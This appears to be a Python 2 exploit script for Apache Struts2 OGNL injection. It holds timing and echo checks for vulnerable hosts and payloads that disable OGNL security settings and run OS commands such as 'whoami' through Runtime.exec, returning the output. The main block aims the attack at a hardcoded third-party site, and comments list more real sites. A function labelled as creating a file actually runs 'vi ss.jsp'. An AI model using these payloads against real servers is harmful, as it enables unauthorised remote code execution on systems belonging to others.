#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#http://www.2cto.com/kf/201304/202422.html
import os,sys
import httplib
import string
import time
import urlparse
import urllib

def SendHTTPRequest(strMethod,strScheme,strHost,strURL,strParam):
    headers = {
        "Accept": "image/gif, */*",
        "Referer": strScheme + "://" + strHost,
        "Accept-Language": "zh-cn",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Host": strHost,
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache"
    }
    strRet=""
    time_inter=0
    #con2=None
    try:
        time1=0
        time2=0
        time1=time.time() * 1000
        if strScheme.upper()=="HTTPS":
            con2 = httplib.HTTPSConnection(strHost)
        else:
            con2 = httplib.HTTPConnection(strHost)

        if strMethod.upper()=="POST":
            con2.request(method="POST",url= strURL, body=strParam, headers=headers)
        else:
            con2.request(method="GET",url= strURL, headers=headers)
        r2 = con2.getresponse()
        strRet= r2.read().strip()
        time2=time.time() * 1000
        time_inter=time2-time1
        #con2.close
    except BaseException,e:
        print e
        #con2.close
    return (time_inter,strRet)

##www.itzhe.org
def RunTest1(strScheme,strHost,strURL):
    payload1="""('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(8000)')(d))"""
    (inter1,html1)=SendHTTPRequest("GET",strScheme,strHost,strURL,"")
    (inter2,html2)=SendHTTPRequest("POST",strScheme,strHost,strURL,payload1)
    if (inter2 - inter1)>6000:
        return True
    else:
        return False

def RunTest2(strScheme,strHost,strURL):
    payload1="""('\\43_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(d))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(asdf)(('\\43rp\\75@org.apache.struts2.ServletActionContext@getResponse()')(c))&(fgd)(('\\43rp.getWriter().print("struts2-security")')(d))&(fgd)&(grgr)(('\\43rp.getWriter().close()')(d))=1"""
    (inter1,html1)=SendHTTPRequest("POST",strScheme,strHost,strURL,payload1)
    if html1.find("struts2-security")>=0:
        return True
    else:
        return False

def whoami(strScheme,strHost,strURL):  #whoami  当前用户
    data="whoami"
    payload1="""('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')
    (b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'%s\\'')(d))&(h)
    (('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')
    (d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')
    (d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))"""%(data)
    (inter1,html1)=SendHTTPRequest("POST",strScheme,strHost,strURL,payload1)
    return html1[0:10]  #读取指定长度

def cat_file(strScheme,strHost,strURL):  #创建文件
    data="vi\40ss.jsp"
    payload1="""('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')
    (b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'%s\\'')(d))&(h)
    (('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')
    (d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')
    (d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))"""%(data)
    (inter1,html1)=SendHTTPRequest("POST",strScheme,strHost,strURL,payload1)
    return html1

def RunTests(strURL):
    t_url=urlparse.urlparse(strURL)  #打开URL
    strScheme=t_url.scheme
    strHost = t_url.netloc
    strURL1 = t_url.path
    #print whoami(strScheme,strHost,strURL1)   #whoami  当前用户
    print cat_file(strScheme,strHost,strURL1)
#    print "开始：" + strURL
#    if RunTest1(strScheme,strHost,strURL1):
#        print "111111!"
#        return True
#    elif RunTest2(strScheme,strHost,strURL1):
#        print "2222222!"
#        return True
#    else:
#        print "安全."
#        return False


if __name__ == "__main__":
    #if len(sys.argv)!=2:
    #    print "INVALID ARGUMENTS."
    #    exit()
    #http://www.syfc.com.cn/fqzj/index.action
    #http://www.youcabaret.it/videoShare/view/start.action
    #http://www.51taoshi.com/fore/zycenter/index.action
    #
    m_URL="http://www.hbhk.com.cn/index.action"
    RunTests(m_URL)





